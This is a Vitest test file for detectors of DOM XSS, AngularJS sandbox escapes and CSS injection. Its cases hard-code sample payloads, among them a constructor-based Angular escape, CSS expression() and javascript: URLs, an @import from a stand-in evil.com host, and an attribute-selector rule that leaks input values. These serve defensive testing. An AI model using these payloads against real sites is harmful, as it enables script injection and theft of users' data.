import { describe, it, expect } from 'vitest'
import { l2DomXss, l2AngularSandboxEscape, l2CssInjection } from './l2-adapters.js'

describe('l2DomXss', () => {
    it('detects direct source-to-sink DOM XSS at 0.90 confidence', () => {
        const payload = 'document.write(location.hash)'
        const result = l2DomXss(payload, payload)
        expect(result).not.toBeNull()
        expect(result!.detected).toBe(true)
        expect(result!.confidence).toBe(0.90)
    })

    it('detects indirect tainted flow at 0.82 confidence', () => {
        const payload = 'const p = location.search; element.innerHTML = p'
        const result = l2DomXss(payload, payload)
        expect(result).not.toBeNull()
        expect(result!.detected).toBe(true)
        expect(result!.confidence).toBe(0.82)
    })

    it('does not detect benign HTML/text snippets', () => {
        const benign = [
            '<div class="hero"><p>Safe content</p></div>',
            '<a href="/docs/getting-started">Read docs</a>',
            'window.location.hash is a URL fragment concept',
            '<span data-kind="note">No script sinks here</span>',
        ]
        for (const sample of benign) {
            expect(l2DomXss(sample, sample)).toBeNull()
        }
    })
})

describe('l2AngularSandboxEscape', () => {
    it('detects AngularJS 1.x sandbox escape primitives at 0.88 confidence', () => {
        const payload = '{{constructor.constructor("alert(1)")()}}'
        const result = l2AngularSandboxEscape(payload, payload)
        expect(result).not.toBeNull()
        expect(result!.detected).toBe(true)
        expect(result!.confidence).toBe(0.88)
    })

    it('does not detect benign Angular templates', () => {
        const benign = [
            '{{ user.name }}',
            '<div ng-bind="profile.title"></div>',
            '{{ total | currency }}',
            '<li ng-repeat="item in items">{{item}}</li>',
        ]
        for (const sample of benign) {
            expect(l2AngularSandboxEscape(sample, sample)).toBeNull()
        }
    })
})

describe('l2CssInjection', () => {
    it('detects expression() and javascript url() at 0.90 confidence', () => {
        const expressionPayload = 'width: expression(alert(1));'
        const expressionResult = l2CssInjection(expressionPayload, expressionPayload)
        expect(expressionResult).not.toBeNull()
        expect(expressionResult!.detected).toBe(true)
        expect(expressionResult!.confidence).toBe(0.90)

        const jsUrlPayload = 'background-image:url(javascript:void(0))'
        const jsUrlResult = l2CssInjection(jsUrlPayload, jsUrlPayload)
        expect(jsUrlResult).not.toBeNull()
        expect(jsUrlResult!.detected).toBe(true)
        expect(jsUrlResult!.confidence).toBe(0.90)
    })

    it('detects @import and attribute-based exfil at 0.83 confidence', () => {
        const importPayload = '@import url(https://evil.com/steal.css);'
        const importResult = l2CssInjection(importPayload, importPayload)
        expect(importResult).not.toBeNull()
        expect(importResult!.detected).toBe(true)
        expect(importResult!.confidence).toBe(0.83)

        const attrPayload = 'input[value^=a] { background: url(?leak=a) }'
        const attrResult = l2CssInjection(attrPayload, attrPayload)
        expect(attrResult).not.toBeNull()
        expect(attrResult!.detected).toBe(true)
        expect(attrResult!.confidence).toBe(0.83)
    })

    it('does not detect benign CSS', () => {
        const benign = [
            'color: red;',
            'background: url(logo.png);',
            '.card { border: 1px solid #ddd; }',
            'body { margin: 0; font-family: sans-serif; }',
        ]
        for (const sample of benign) {
            expect(l2CssInjection(sample, sample)).toBeNull()
        }
    })
})
